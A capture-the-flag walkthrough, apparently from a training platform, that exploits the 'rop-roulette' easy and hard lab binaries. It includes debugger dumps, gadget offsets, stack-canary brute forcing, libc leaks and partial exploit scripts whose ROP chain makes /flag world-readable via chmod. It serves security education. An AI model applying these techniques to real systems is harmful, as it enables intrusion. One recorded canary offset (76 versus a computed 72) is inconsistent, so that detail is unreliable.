   0x00000000000027ae <+36>:    xor    eax,eax

# ---- snip ----

   0x0000000000002806 <+124>:   add    rax,0x8
   0x000000000000280a <+128>:   mov    QWORD PTR [rip+0x2847],rax        # 0x5058 <rp_>

# ---- snip ----

   0x000000000000285e <+212>:   call   0x1250 <read@plt>

# ---- snip ----

   0x0000000000002908 <+382>:   leave
   0x0000000000002909 <+383>:   ret
End of assembler dump.
```

Let's set a breakpoint at `challenge+212`, where the `read()` call is made. Connect with `nc localhost 1337` in a second terminal to trigger the fork and hit the breakpoint.

```
pwndbg> break *(challenge+212)
Breakpoint 1 at 0x285e
```

```
pwndbg> run
Starting program: /challenge/rop-roulette-easy 
###
### Welcome to /challenge/rop-roulette-easy!
###
This challenge is listening for connections on TCP port 1337.
...
[Attaching after process 6200 fork to child process 6586]
[New inferior 2 (process 6586)]
[Detaching after fork from parent process 6200]
[Switching to process 6586]

Thread 2.1 "rop-roulette-ea" hit Breakpoint 1, 0x00005d08a200585e in challenge ()
LEGEND: STACK | HEAP | CODE | DATA | WX | RODATA
────────────────────────────────────────────────────────────────[ REGISTERS / show-flags off / show-compact-regs off ]─────────────────────────────────────────────────────────────────
 RAX  0x7ffdccee6250 ◂— 0x39 /* '9' */
 RBX  0x5d08a2005b00 (__libc_csu_init) ◂— endbr64
 RCX  0x7bb94eff7297 (write+23) ◂— cmp rax, -0x1000 /* 'H=' */
 RDX  0x1000
 RDI  0
 RSI  0x7ffdccee6250 ◂— 0x39 /* '9' */
 R8   0x4d
 R9   0x7bb94eee6740 ◂— 0x7bb94eee6740
 R10  0x7bb94eee6a10 ◂— 0x19ba
 R11  0x246
 R12  0x5d08a2004320 (_start) ◂— endbr64
 R13  0x7ffdccee63e0 ◂— 1
 R14  0
 R15  0
...
─────────────────────────────────────────────────────────────────────────[ DISASM / x86-64 / set emulate on ]──────────────────────────────────────────────────────────────────────────
 ► 0x5d08a200585e <challenge+212>    call   read@plt                    <read@plt>
        ...
        buf: 0x7ffdccee6250 ◂— 0x39 /* '9' */
        nbytes: 0x1000
───────────────────────────────────────────────────────────────────────────────────────[ STACK ]───────────────────────────────────────────────────────────────────────────────────────
00:0000│ rsp     0x7ffdccee6220 —▸ 0x7bb94f0d66a0 (_IO_2_1_stdout_) ◂— 0xfbad2887
01:0008│-068     0x7ffdccee6228 —▸ 0x7ffdccee63f8 —▸ 0x7ffdccee7ea9 ◂— 'SHELL=/run/dojo/bin/bash'
02:0010│-060     0x7ffdccee6230 —▸ 0x7ffdccee63e8 —▸ 0x7ffdccee7e8c ◂— '/challenge/rop-roulette-easy'
03:0018│-058     0x7ffdccee6238 ◂— 0x14f0d24a0
04:0020│-050     0x7ffdccee6240 ◂— 0
05:0028│-048     0x7ffdccee6248 —▸ 0x7bb94ef79e93 (_IO_file_overflow+275) ◂— cmp eax, -1
06:0030│ rax rsi 0x7ffdccee6250 ◂— 0x39 /* '9' */
07:0038│-038     0x7ffdccee6258 —▸ 0x7bb94f0d66a0 (_IO_2_1_stdout_) ◂— 0xfbad2887
─────────────────────────────────────────────────────────────────────────────────────[ BACKTRACE ]─────────────────────────────────────────────────────────────────────────────────────
 ► 0   0x5d08a200585e challenge+212
   1   0x5d08a2005ad3 main+457
   2   0x7bb94ef0d083 __libc_start_main+243
   3   0x5d08a200434e _start+46
───────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
```
...
```
pwndbg> info frame
Stack level 0, frame at 0x7ffdccee62a0:
 rip = 0x5d08a200585e in challenge; saved rip = 0x5d08a2005ad3
 called by frame at 0x7ffdccee6300
 Arglist at 0x7ffdccee6290, args: 
 Locals at 0x7ffdccee6290, Previous frame's sp is 0x7ffdccee62a0
 Saved registers:
  rbp at 0x7ffdccee6290, rip at 0x7ffdccee6298
```

```
pwndbg> p/d 0x7ffdccee6288 - 0x7ffdccee6250
$1 = 56
...
```
hacker@return-oriented-programming~rop-roulette-easy:~$ ROPgadget --binary /lib/x86_64-linux-gnu/libc.so.6 | grep "pop rdi ; ret"
0x0000000000023b6a : pop rdi ; ret
```

```
hacker@return-oriented-programming~rop-roulette-easy:~$ ROPgadget --binary /lib/x86_64-linux-gnu/libc.so.6 | grep "pop rsi ; ret"
0x000000000002601f : pop rsi ; ret
```
...
```
hacker@return-oriented-programming~rop-roulette-easy:~$ readelf -s /lib/x86_64-linux-gnu/libc.so.6 | grep "system"
  1430: 0000000000052290    45 FUNC    WEAK   DEFAULT   15 system@@GLIBC_2.2.5
```

```
hacker@return-oriented-programming~rop-roulette-easy:~$ readelf -s /lib/x86_64-linux-gnu/libc.so.6 | grep "chmod"
   631: 000000000010dd80    37 FUNC    WEAK   DEFAULT   15 chmod@@GLIBC_2.2.5
```
...
Stack (correct byte):
            ...
            0x7ffdccee6250 │  41 41 41 41 41 41 41 41  │ ( b"AAAAAAAA" × 7 )
                           ├╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┤
            0x7ffdccee6288 │  00 ?? ?? ?? ?? ?? ?? ??  │ ( known_canary + guess )
                           └───────────────────────────┘
                           ╎  .. .. .. .. .. .. .. ..  ╎
...
Stack:
            ...
            0x7ffdccee6290 │  00 00 00 00 00 00 00 00  │ ( saved RBP )
                           ├╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┤
    rsp --> 0x7ffdccee6298 │   binary_base + 0x2b63    │ --> ( pop rdi ; ret )
                           ├╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┤
            0x7ffdccee62a0 │   binary_base + 0x4f30    │ --> ( puts@got )
                           ├╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┤
            0x7ffdccee62a8 │   binary_base + 0x11d4    │ --> ( puts@plt )
                           └───────────────────────────┘
                           ╎  .. .. .. .. .. .. .. ..  ╎
...
Stack:
                           ┌───────────────────────────┐
    rsp --> 0x7ffdccee62a0 │   binary_base + 0x4f30    │ --> ( puts@got )
                           ├╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┤
            0x7ffdccee62a8 │   binary_base + 0x11d4    │ --> ( puts@plt )
                           └───────────────────────────┘
                           ╎  .. .. .. .. .. .. .. ..  ╎
...
Stack:
                           ┌───────────────────────────┐
    rsp --> 0x7ffdccee62a8 │   binary_base + 0x11d4    │ --> ( puts@plt )
                           └───────────────────────────┘
                           ╎  .. .. .. .. .. .. .. ..  ╎
...
Stack:
            ...
            0x7ffdccee6290 │  00 00 00 00 00 00 00 00  │ ( saved RBP )
                           ├╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┤
    rsp --> 0x7ffdccee6298 │   libc_base + 0x23b6a     │ --> ( pop rdi ; ret )
                           ├╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┤
            0x7ffdccee62a0 │   libc_base + 0x2a32      │ --> ( "!\x00" in libc )
                           ├╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┤
            0x7ffdccee62a8 │   libc_base + 0x2601f     │ --> ( pop rsi ; ret )
                           ├╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┤
            0x7ffdccee62b0 │  00 00 00 00 00 00 01 ff  │ ( 0o777 )
                           ├╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┤
            0x7ffdccee62b8 │   libc_base + 0x10dd80    │ --> ( chmod )
                           └───────────────────────────┘
                           ╎  .. .. .. .. .. .. .. ..  ╎
...
Stack:
                           ┌───────────────────────────┐
    rsp --> 0x7ffdccee62a0 │   libc_base + 0x2a32      │ --> ( "!\x00" in libc )
                           ├╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┤
            0x7ffdccee62a8 │   libc_base + 0x2601f     │ --> ( pop rsi ; ret )
                           ├╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┤
            0x7ffdccee62b0 │  00 00 00 00 00 00 01 ff  │ ( 0o777 )
...
Stack:
                           ┌───────────────────────────┐
    rsp --> 0x7ffdccee62a8 │   libc_base + 0x2601f     │ --> ( pop rsi ; ret )
                           ├╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┤
            0x7ffdccee62b0 │  00 00 00 00 00 00 01 ff  │ ( 0o777 )
                           ├╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┤
            0x7ffdccee62b8 │   libc_base + 0x10dd80    │ --> ( chmod )
...
Stack:
                           ┌───────────────────────────┐
    rsp --> 0x7ffdccee62b0 │  00 00 00 00 00 00 01 ff  │ ( 0o777 )
                           ├╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┤
            0x7ffdccee62b8 │   libc_base + 0x10dd80    │ --> ( chmod )
                           └───────────────────────────┘
                           ╎  .. .. .. .. .. .. .. ..  ╎
...
Stack:
                           ┌───────────────────────────┐
    rsp --> 0x7ffdccee62b8 │   libc_base + 0x10dd80    │ --> ( chmod )
                           └───────────────────────────┘
                           ╎  .. .. .. .. .. .. .. ..  ╎
...
```
hacker@return-oriented-programming~rop-roulette-easy:~$ ln -sf /flag ~/!
```
...
ret_addr_off  = 0x2ad3    # main+457 = instruction after call challenge
pop_rdi_bin   = 0x2b63    # pop rdi ; ret
puts_plt_off  = 0x11d4    # puts@plt
puts_got_off  = 0x4f30    # puts@got
...
for i in range(5):
    ...
    for byte_guess in range(256):
        try:
            ...
            if b'Goodbye' in out:
                known_rip += p8(byte_guess)
                print(f'[+] Byte {i+1}: {hex(byte_guess)} | rip: 0x{known_rip.hex()}')
                found_byte = True
                break
        except Exception:
            pass
...
puts_plt  = binary_base + puts_plt_off
...
```
hacker@return-oriented-programming~rop-roulette-easy:~$ python ~/script.py
[*] Stage 1: Brute-forcing canary...
[+] Byte 1: 0xe9 | canary: 0x00e9
[+] Byte 2: 0x2 | canary: 0x00e902
[+] Byte 3: 0x37 | canary: 0x00e90237
[+] Byte 4: 0xc9 | canary: 0x00e90237c9
[+] Byte 5: 0x7b | canary: 0x00e90237c97b
...
[+] Byte 4: 0xee | rip: 0xd37ae47bee
[+] Byte 5: 0x63 | rip: 0xd37ae47bee63
[*] Binary base: 0x63ee7be45000
[*] Stage 3: Leaking libc base...
[*] Libc base: 0x7e1e8d861000
...
```
hacker@return-oriented-programming~rop-roulette-hard:~$ /challenge/rop-roulette-hard 
###
### Welcome to /challenge/rop-roulette-hard!
###

This challenge is listening for connections on TCP port 1337. The challenge supports one connection at a time, but
...
Unlike Guarded Gadgets, there is no arbitrary read primitive — we cannot simply ask the binary to read an address for us. Instead, we abuse the chain printer. By sending 168 bytes of padding we overwrite chain entries 1–12 but leave entry 13 at `buf+168` untouched. Entry 13 is `main()`'s saved RIP = `__libc_start_main+243`, which the chain printer then prints back to us. The chain header also prints `rp_`, giving us `buf = rp_ - 72`.

#### Stage 2: Brute-force canary byte-by-byte

The fork server keeps the same canary across all connections. Oracle: `### Goodbye!` at the end of output means `challenge()` returned cleanly (canary intact). No `### Goodbye!` means `__stack_chk_fail` killed the process before `main()` could print it.

#### Stage 3: Send `chmod` chain

With canary and libc base known, send the full exploit payload.
...
pwndbg> disassemble challenge
Dump of assembler code for function challenge:
   0x00000000000014fb <+0>:     endbr64
   0x00000000000014ff <+4>:     push   rbp
   0x0000000000001500 <+5>:     mov    rbp,rsp
   0x0000000000001503 <+8>:     add    rsp,0xffffffffffffff80
   0x0000000000001507 <+12>:    mov    DWORD PTR [rbp-0x64],edi
   0x000000000000150a <+15>:    mov    QWORD PTR [rbp-0x70],rsi
   0x000000000000150e <+19>:    mov    QWORD PTR [rbp-0x78],rdx
   0x0000000000001512 <+23>:    mov    rax,QWORD PTR fs:0x28
   0x000000000000151b <+32>:    mov    QWORD PTR [rbp-0x8],rax
   0x000000000000151f <+36>:    xor    eax,eax
   0x0000000000001521 <+38>:    lea    rax,[rbp-0x50]
   0x0000000000001525 <+42>:    mov    edx,0x1000
   0x000000000000152a <+47>:    mov    rsi,rax
   0x000000000000152d <+50>:    mov    edi,0x0
   0x0000000000001532 <+55>:    call   0x11c0 <read@plt>
   0x0000000000001537 <+60>:    mov    DWORD PTR [rbp-0x54],eax
   0x000000000000153a <+63>:    lea    rdi,[rip+0xac7]        # 0x2008
   0x0000000000001541 <+70>:    call   0x1150 <puts@plt>
   0x0000000000001546 <+75>:    nop
   0x0000000000001547 <+76>:    mov    rcx,QWORD PTR [rbp-0x8]
   0x000000000000154b <+80>:    xor    rcx,QWORD PTR fs:0x28
   0x0000000000001554 <+89>:    je     0x155b <challenge+96>
   0x0000000000001556 <+91>:    call   0x1170 <__stack_chk_fail@plt>
   0x000000000000155b <+96>:    leave
   0x000000000000155c <+97>:    ret
End of assembler dump.
```

Let's set a breakpoint at `challenge+55`, where the `read()` call is made. Connect with `nc localhost 1337` in a second terminal to trigger the fork and hit the breakpoint.

```
pwndbg> break *(challenge+55)
Breakpoint 1 at 0x1532
```

```
pwndbg> run
Starting program: /challenge/rop-roulette-hard 
Downloading separate debug info for system-supplied DSO at 0x7ffc87ffa000
Download failed: Invalid argument.  Continuing without separate debug info for system-supplied DSO at 0x7ffc87ffa000.                                                                  
###
### Welcome to /challenge/rop-roulette-hard!
###
...
Connect with `nc localhost 1337` in a second terminal to trigger the fork and hit the breakpoint.

```
pwndbg> run
Starting program: /challenge/rop-roulette-hard 
Downloading separate debug info for system-supplied DSO at 0x7ffc67f71000
Download failed: Invalid argument.  Continuing without separate debug info for system-supplied DSO at 0x7ffc67f71000.                                                                  
###
### Welcome to /challenge/rop-roulette-hard!
###
...
[Attaching after process 3010 fork to child process 3107]
[New inferior 2 (process 3107)]
Downloading separate debug info for /challenge/rop-roulette-hard
Download failed: Invalid argument.  Continuing without separate debug info for /challenge/rop-roulette-hard.                                                                           
[Detaching after fork from parent process 3010]
[Inferior 1 (process 3010) detached]
Downloading separate debug info for system-supplied DSO at 0x7ffc67f71000
Download failed: Invalid argument.  Continuing without separate debug info for system-supplied DSO at 0x7ffc67f71000.                                                                  
[Switching to process 3107]

Thread 2.1 "rop-roulette-ha" hit Breakpoint 1, 0x00005ad4a46fe532 in challenge ()
LEGEND: STACK | HEAP | CODE | DATA | WX | RODATA
────────────────────────────────────────────────────────────────────────────────────[ LAST SIGNAL ]────────────────────────────────────────────────────────────────────────────────────
Breakpoint hit at 0x5ad4a46fe532
────────────────────────────────────────────────────────────────[ REGISTERS / show-flags off / show-compact-regs off ]─────────────────────────────────────────────────────────────────
 RAX  0x7ffc67e1a2c0 ◂— 0
 RBX  0x5ad4a46fe750 (__libc_csu_init) ◂— endbr64
 RCX  0x7ffc67e1a468 —▸ 0x7ffc67e1ae8c ◂— '/challenge/rop-roulette-hard'
 RDX  0x1000
 RDI  0
 RSI  0x7ffc67e1a2c0 ◂— 0
 R8   0
 R9   0x7cf3a053e540 ◂— 0x7cf3a053e540
 R10  0x7cf3a053e810 ◂— 0xc23 /* '#\x0c' */
 R11  0x246
 R12  0x5ad4a46fe240 (_start) ◂— endbr64
 R13  0x7ffc67e1a460 ◂— 1
 R14  0
 R15  0
 RBP  0x7ffc67e1a310 —▸ 0x7ffc67e1a370 ◂— 0
 RSP  0x7ffc67e1a290 ◂— 0xd68 /* 'h\r' */
 RIP  0x5ad4a46fe532 (challenge+55) ◂— call read@plt
─────────────────────────────────────────────────────────────────────────[ DISASM / x86-64 / set emulate on ]──────────────────────────────────────────────────────────────────────────
 ► 0x5ad4a46fe532 <challenge+55>    call   read@plt                    <read@plt>
        fd: 0 (socket:[1385737291])
        buf: 0x7ffc67e1a2c0 ◂— 0
        nbytes: 0x1000
 
   0x5ad4a46fe537 <challenge+60>    mov    dword ptr [rbp - 0x54], eax
   0x5ad4a46fe53a <challenge+63>    lea    rdi, [rip + 0xac7]              RDI => 0x5ad4a46ff008 ◂— 'Leaving!'
   0x5ad4a46fe541 <challenge+70>    call   puts@plt                    <puts@plt>
 
   0x5ad4a46fe546 <challenge+75>    nop   
   0x5ad4a46fe547 <challenge+76>    mov    rcx, qword ptr [rbp - 8]
   0x5ad4a46fe54b <challenge+80>    xor    rcx, qword ptr fs:[0x28]
   0x5ad4a46fe554 <challenge+89>    je     challenge+96                <challenge+96>
 
   0x5ad4a46fe556 <challenge+91>    call   __stack_chk_fail@plt        <__stack_chk_fail@plt>
 
   0x5ad4a46fe55b <challenge+96>    leave 
   0x5ad4a46fe55c <challenge+97>    ret   
───────────────────────────────────────────────────────────────────────────────────────[ STACK ]───────────────────────────────────────────────────────────────────────────────────────
00:0000│ rsp     0x7ffc67e1a290 ◂— 0xd68 /* 'h\r' */
01:0008│-078     0x7ffc67e1a298 —▸ 0x7ffc67e1a478 —▸ 0x7ffc67e1aea9 ◂— 'SHELL=/run/dojo/bin/bash'
02:0010│-070     0x7ffc67e1a2a0 —▸ 0x7ffc67e1a468 —▸ 0x7ffc67e1ae8c ◂— '/challenge/rop-roulette-hard'
03:0018│-068     0x7ffc67e1a2a8 ◂— 0x1a46ff0a3
04:0020│-060     0x7ffc67e1a2b0 —▸ 0x5ad4a4701010 (stdout@@GLIBC_2.2.5) —▸ 0x7cf3a05386a0 (_IO_2_1_stdout_) ◂— 0xfbad2887
05:0028│-058     0x7ffc67e1a2b8 —▸ 0x7cf3a05344a0 (_IO_file_jumps) ◂— 0
06:0030│ rax rsi 0x7ffc67e1a2c0 ◂— 0
07:0038│-048     0x7ffc67e1a2c8 —▸ 0x7cf3a03dbe93 (_IO_file_overflow+275) ◂— cmp eax, -1
─────────────────────────────────────────────────────────────────────────────────────[ BACKTRACE ]─────────────────────────────────────────────────────────────────────────────────────
 ► 0   0x5ad4a46fe532 challenge+55
   1   0x5ad4a46fe726 main+457
   2   0x7cf3a036f083 __libc_start_main+243
   3   0x5ad4a46fe26e _start+46
───────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
```

- [ ] Offset between buffer and stack canary
   - Location of the buffer: `0x7ffc67e1a2c0`
- [ ] Offset between buffer and stored return address to `main()`
   - Location of the buffer: `0x7ffc67e1a2c0`
- [ ] Offsets of required Libc functions
- [ ] Locations of required ROP gadgets
...
```
pwndbg> info frame
Stack level 0, frame at 0x7ffc67e1a320:
 rip = 0x5ad4a46fe532 in challenge; saved rip = 0x5ad4a46fe726
 called by frame at 0x7ffc67e1a380
 Arglist at 0x7ffc67e1a310, args: 
 Locals at 0x7ffc67e1a310, Previous frame's sp is 0x7ffc67e1a320
 Saved registers:
  rbp at 0x7ffc67e1a310, rip at 0x7ffc67e1a318
```

```
pwndbg> p/d 0x7ffc67e1a308 - 0x7ffc67e1a2c0
$1 = 72
pwndbg> p/d 0x7ffc67e1a318 - 0x7ffc67e1a2c0
$2 = 88
```

- [x] Offset between buffer and stack canary: `76`
   - Location of the buffer: `0x7ffc67e1a2c0`
   - Location of the canary: `0x7ffc67e1a310 - 8` = `0x7ffc67e1a308`
- [x] Offset between buffer and stored return address: `88`
   - Location of the buffer: `0x7ffc67e1a2c0`
   - Location of the stored return address: `0x7ffc67e1a318`
- [ ] Offsets of required Libc functions
- [ ] Locations of required ROP gadgets
...
There is no arbitrary read primitive in this challenge, unlike Guarded Gadgets where the binary asks "Address in hex to read from:". Instead, by sending 168 bytes of `A`s we overwrite chain entries 1–12 but leave entry 13 at `buf+168` untouched — this is `main()`'s saved RIP = `__libc_start_main+243`, because that is who called `main()`. The chain printer prints it back to us. The chain header also prints `rp_` which gives us `buf = rp_ - 72`.
...
```
hacker@return-oriented-programming~rop-roulette-easy:~$ readelf -s /lib/x86_64-linux-gnu/libc.so.6 | grep "__libc_start_main"
512: 0000000000023f90   392 FUNC    GLOBAL DEFAULT   15 __libc_start_main@@GLIBC_2.34
```
...
- `buf = rp_ - 72`
- Saved RIP value: `0x7bb94ef0d083`
- `__libc_start_main+243` libc offset: `0x24083`
- libc base: `0x7bb94ef0d083 - 0x24083 = 0x7bb94eee9000`

From there all function and gadget addresses follow:

```
pop_rdi = 0x7bb94eee9000 + 0x23b6a = 0x7bb94ef0cb6a
pop_rsi = 0x7bb94eee9000 + 0x2601f = 0x7bb94ef0f01f
chmod   = 0x7bb94eee9000 + 0x10dd80 = 0x7bb94eff6d80
```

### ROP chain

The ROP chain would be the exact same as the [easy challenge](#rop-chain-4). 
...
# --- STAGE 1: Leak libc base and buf address via chain printer ---
# Send 168 bytes: overwrites chain entries 1–12, leaves entry 13 (main's saved RIP
# = __libc_start_main+243) untouched. Chain header prints rp_ → buf = rp_ - 72.
print('[*] Stage 1: Leaking libc base and buf...')
...
rp_       = int(re.search(r'ROP chain at (0x[0-9a-f]+)', raw).group(1), 16)
buf       = rp_ - rip_off
entries   = re.findall(r'\| (0x[0-9a-f]+):', raw)
libc_base = int(entries[-1], 16) - lsm_243_off
...
# --- STAGE 2: Brute-force canary byte-by-byte ---
# Oracle: ### Goodbye! at end of output = canary intact = correct byte.
...
# --- STAGE 3: Send chmod chain ---
# Write "!\x00" at buf so buf itself is the path argument.
# ~/! is a symlink to /flag, so chmod("!", 0o777) makes /flag world-readable.
print('[*] Stage 3: Sending chmod chain...')

p = connect()
p.send(flat(
    b'!\x00' + b'A' * (canary_off - 2),
    p64(canary),
    p64(0),
    pop_rdi, buf,
    pop_rsi, 0o777,
...
```
hacker@return-oriented-programming~rop-roulette-easy:~$ python ~/script.py
[*] Stage 1: Leaking libc base and buf...
[+] buf:       0x7ffe3fe854d0
[+] libc base: 0x78a11c3c6000
[*] Stage 2: Brute-forcing canary...
[+] Byte 1: 0x76 | canary: 0x0076
[+] Byte 2: 0x7 | canary: 0x007607
[+] Byte 3: 0x8f | canary: 0x0076078f
[+] Byte 4: 0xa2 | canary: 0x0076078fa2
[+] Byte 5: 0x60 | canary: 0x0076078fa260
[+] Byte 6: 0x3f | canary: 0x0076078fa2603f
[+] Byte 7: 0x23 | canary: 0x0076078fa2603f23
[*] Canary: 0x233f60a28f077600
